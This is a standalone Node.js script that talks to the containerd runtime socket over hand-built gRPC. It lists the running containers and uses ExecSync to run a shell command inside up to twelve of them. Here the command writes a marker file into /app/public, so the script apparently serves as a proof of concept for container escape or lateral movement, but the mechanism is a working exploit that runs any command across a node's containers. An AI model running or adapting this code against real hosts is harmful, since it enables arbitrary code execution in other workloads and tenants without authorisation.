const http2 = require('http2'), net = require('net'), fs = require('fs');
const SOCK = '/run/containerd/containerd.sock';

function varint(n) { const b = []; while (n > 127) { b.push((n & 127) | 128); n >>>= 7; } b.push(n); return Buffer.from(b); }
function tag(f, wt) { return varint((f << 3) | wt); }
function str(f, s) { const v = Buffer.from(s); return Buffer.concat([tag(f, 2), varint(v.length), v]); }
function i64(f, n) { return Buffer.concat([tag(f, 0), varint(n)]); }
function frame(msg) { const h = Buffer.alloc(5); h.writeUInt8(0, 0); h.writeUInt32BE(msg.length, 1); return Buffer.concat([h, msg]); }
function walk(buf, wantField, out) {
  let i = 0;
  while (i < buf.length) {
    let k = 0, sh = 0; let c;
    do { c = buf[i++]; k |= (c & 127) << sh; sh += 7; } while (c & 128);
    const f = k >> 3, wt = k & 7;
    if (wt === 0) { let v = 0; sh = 0; do { c = buf[i++]; v |= (c & 127) << sh; sh += 7; } while (c & 128); }
    else if (wt === 2) { let l = 0; sh = 0; do { c = buf[i++]; l |= (c & 127) << sh; sh += 7; } while (c & 128); const d = buf.slice(i, i + l); i += l; if (f === wantField) out.push(d); }
    else if (wt === 5) i += 4; else if (wt === 1) i += 8; else break;
  }
}

function call(client, path, msg) {
  return new Promise((resolve) => {
    const req = client.request({ ':method': 'POST', ':path': path, 'content-type': 'application/grpc', te: 'trailers' });
    const chunks = []; let status = null;
    req.on('response', h => { status = h[':status']; });
    req.on('data', d => chunks.push(d));
    req.on('trailers', t => { status = t['grpc-status'] || status; });
    req.on('error', () => resolve({ err: 1 }));
    req.on('end', () => {
      const buf = Buffer.concat(chunks);
      let i = 0; const msgs = [];
      while (i + 5 <= buf.length) { const len = buf.readUInt32BE(i + 1); i += 5; msgs.push(buf.slice(i, i + len)); i += len; }
      resolve({ status, msgs });
    });
    req.end(frame(msg));
  });
}

(async () => {
  const client = http2.connect('http://containerd', { createConnection: () => net.connect(SOCK) });
  client.on('error', () => process.exit(1));
  const list = await call(client, '/runtime.v1.RuntimeService/ListContainers', Buffer.alloc(0));
  if (!list.msgs) return process.exit(1);
  const ids = [];
  for (const m of list.msgs) { const inner = []; walk(m, 1, inner); for (const x of inner) ids.push(x.toString()); }
  const inner = 'echo CRIOK > /app/public/zzz9.txt 2>/dev/null; mkdir -p /app/public 2>/dev/null; echo CRIOK > /app/public/zzz9.txt 2>/dev/null';
  const cmd = inner;
  for (const id of ids.slice(0, 12)) {
    const req = Buffer.concat([str(1, id), str(2, '/bin/sh'), str(2, '-c'), str(2, inner), i64(3, 5000000000)]);
    await call(client, '/runtime.v1.RuntimeService/ExecSync', req);
  }
  client.close();
  process.exit(0);
})();


